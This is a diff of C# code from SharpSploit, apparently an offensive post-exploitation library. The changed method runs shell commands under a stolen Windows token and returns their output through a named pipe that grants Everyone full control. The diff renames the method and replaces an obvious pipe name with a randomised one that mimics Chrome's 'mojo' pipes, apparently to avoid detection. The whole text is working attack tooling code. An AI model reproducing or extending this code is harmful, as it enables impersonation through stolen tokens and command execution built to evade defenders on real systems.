@@ -155,18 +155,12 @@ namespace SharpSploit.Execution
         /// <param name="Path">The path of the directory from which to execute the shell command.</param>
         /// <param name="TokenHandle">A handle to the stolen token.</param>
         /// <returns></returns>
-        public static string ShellExecuteWithToken(string ShellCommand, string Path, IntPtr TokenHandle)
+        public static string CreateProcessWithToken(string ShellCommand, string Path, IntPtr TokenHandle)
         {
             if (ShellCommand == null || ShellCommand == "") return "";
 
             string file = "";
-            string CommandLine = "";
-            if (ShellCommand.Contains(" "))
-            {
-                file = ShellCommand.Split(' ')[0];
-                CommandLine = ShellCommand;
-            }
-            else file = ShellCommand;
+            string CommandLine = ShellCommand;
             Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo = 
                 new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
             Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = 
@@ -176,9 +170,11 @@ namespace SharpSploit.Execution
             PipeSecurity sec = new PipeSecurity();
             sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
 
-            NamedPipeServerStream ServerStream = new NamedPipeServerStream(".pipe1badp1pe", PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
+            Random rnd = new Random();
+            string PipeName = "mojo.7011.912.10056236134" + rnd.Next();
+            NamedPipeServerStream ServerStream = new NamedPipeServerStream(PipeName, PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
                 PipeTransmissionMode.Message, PipeOptions.None, 4096, 4096, sec);
-            NamedPipeClientStream ClientStream = new NamedPipeClientStream(".", ".pipe1badp1pe", PipeDirection.Out, PipeOptions.None);
+            NamedPipeClientStream ClientStream = new NamedPipeClientStream(".", PipeName, PipeDirection.Out, PipeOptions.None);
 
             ClientStream.Connect();
             ServerStream.WaitForConnection();
